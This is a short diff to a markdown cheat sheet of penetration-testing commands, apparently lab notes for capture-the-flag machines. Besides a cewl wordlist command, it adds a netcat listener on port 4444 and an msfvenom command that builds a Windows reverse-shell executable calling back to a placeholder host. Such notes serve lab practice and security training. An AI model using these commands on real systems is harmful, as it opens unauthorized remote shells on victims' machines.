@@ -59,3 +59,17 @@ Password list generator
 ```console
 cewl -d 2 -m 5 -w passwords.txt http://MACHINE_IP --with-numbers
 ```
+
+## nc
+
+```console
+nc -lnvp 4444
+```
+
+## msfvenom
+
+A command-line payload generation tool
+
+```console
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP.ADDRESS.HERE LPORT=4444 -f exe -o reverse.exe
+```
